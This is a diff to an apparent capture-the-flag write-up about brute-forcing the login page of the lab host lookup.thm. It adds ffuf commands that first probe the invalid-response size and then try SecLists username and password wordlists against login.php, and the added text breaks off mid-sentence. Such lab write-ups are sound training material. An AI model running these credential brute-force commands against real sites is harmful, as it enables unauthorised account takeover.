@@ -40,6 +40,29 @@ Now finally that we are waiting for..
 #Bruteforcing Login Page
  For this we are going to use ffuf.
  So we will do the below command to do enumuration to login page.
+ But Before doing so we need to manually send 1 req first to get the response size and number of words in a invalid response.
 
+so i did 
 ```
-ffuf -u
+ffuf -u http://lookup.thm/login.php \
+-w <(echo "random_user"):USER \
+-w <(echo "random_pass"):PASS \
+-X POST \
+-d "username=USER&password=PASS" \
+```
+
+Now what i got as output was
+
+``` [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 64ms]
+    * PASS: random_pass
+    * USER: random_user
+```
+```
+ffuf -v  -u http://lookup.thm/login.php \
+-w /home/Seclists/Usernames/top-usernames-shortlist.txt:USER \
+-w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
+-X POST \
+-d "username=USER&password=PASS" \
+```
+
+Everything was looking fine what i was 
